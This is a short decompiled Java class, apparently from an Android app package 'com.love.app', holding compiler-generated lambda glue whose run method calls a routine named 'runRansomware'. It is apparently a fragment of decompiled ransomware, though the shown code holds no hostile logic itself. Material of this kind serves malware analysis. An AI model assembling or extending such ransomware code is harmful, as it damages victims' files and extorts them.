/*
 * Decompiled with CFR 0.152.
 */
package com.love.app;

import com.love.app.MyService;

public final class MyService$$ExternalSyntheticLambda2
implements Runnable {
    public final MyService f$0;
    public final byte[] f$1;

    public /* synthetic */ MyService$$ExternalSyntheticLambda2(MyService myService, byte[] byArray) {
        this.f$0 = myService;
        this.f$1 = byArray;
    }

    @Override
    public final void run() {
        this.f$0.lambda$runRansomware$2$com_love_app_MyService(this.f$1);
    }
}

